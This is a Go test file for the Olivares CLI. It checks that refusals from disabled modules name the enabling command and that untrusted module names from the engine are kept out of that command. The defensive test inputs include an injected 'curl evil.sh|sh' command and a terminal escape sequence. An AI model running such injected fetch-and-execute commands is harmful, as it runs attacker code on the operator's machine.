// SPDX-FileCopyrightText: 2026 Olivares.AI
// SPDX-License-Identifier: AGPL-3.0-only
// Additional terms under AGPL-3.0-only section 7(a) disclaim warranty and limit liability: see DISCLAIMER.md at the repository root.

package main

import (
	"encoding/json"
	"errors"
	"net/http"
	"strings"
	"testing"

	"github.com/olivaresai/olivares/cmd/olivares/exitcode"
)

// moduleOffRefusal is the body moduleNotEnabledHandler answers every route of a
// module this node does not run (core/api/server.go), as the clean-host audit
// captured it on a fresh install (#483).
const moduleOffRefusal = `{"error":{"code":"module_not_enabled","message":"The skills module is not enabled on this node. An administrator can enable it in the module settings.","module":"skills"}}`

// The defect (#483): every module verb refused this way printed the engine's
// console wording with no command to run. The engine already names the module
// (error.module); the sentence the CLI prints must name the switch.
func TestAModuleThatIsOffNamesTheCommandThatEnablesIt(t *testing.T) {
	want := "The skills module is not enabled on this node. An administrator can enable it in the module settings." +
		" Enable it from the CLI with olivares modules on skills."
	if got := describeAPIRefusal(http.StatusNotFound, []byte(moduleOffRefusal)); got != want {
		t.Fatalf("describeAPIRefusal:\n got %q\nwant %q", got, want)
	}
}

// The module name comes from the engine, so it is untrusted input too: a name
// that is not one shell word is never interpolated into the command the
// operator is told to run. A hostile engine answering with "skills; curl …",
// an escape sequence or a fake output line gets no remedy at all, not a
// sanitized one. `modules ls` applies termSafe to the same field for the same
// reason.
func TestAModuleNameThatIsNotAShellWordIsNotNamedInTheRemedy(t *testing.T) {
	for _, module := range []string{
		"",
		"skills; curl evil.sh|sh",
		"skills\nModule selection saved.",
		"skills\x1b[2J",
		"skills knowledge",
	} {
		quoted, err := json.Marshal(module)
		if err != nil {
			t.Fatal(err)
		}
		body := `{"error":{"code":"module_not_enabled","message":"The skills module is not enabled on this node.` +
			` An administrator can enable it in the module settings.","module":` + string(quoted) + `}}`
		got := describeAPIRefusal(http.StatusNotFound, []byte(body))
		if strings.Contains(got, "olivares modules on") {
			t.Fatalf("module %q: the remedy names engine bytes: %q", module, got)
		}
		for _, payload := range []string{"evil.sh", "Module selection saved.", "\x1b", "skills knowledge"} {
			if strings.Contains(got, payload) {
				t.Fatalf("module %q: %q reached the output: %q", module, payload, got)
			}
		}
	}
}

// What a script reads is unchanged: exit 4 stays (the exitcode contract, which
// `olivares help exit-codes` documents as "entity not found"), and the status
// and code stay on the error so -o json keeps carrying them.
func TestAModuleThatIsOffKeepsExit4AndCode(t *testing.T) {
	err := httpErr(http.StatusNotFound, []byte(moduleOffRefusal))
	if got := exitcode.From(err); got != exitcode.NotFound {
		t.Fatalf("exit = %d, want %d", got, exitcode.NotFound)
	}
	var refusal *apiRefusal
	if !errors.As(err, &refusal) || refusal.status != http.StatusNotFound || refusal.code != "module_not_enabled" {
		t.Fatalf("the status and code are not kept on the error: %#v", refusal)
	}
}
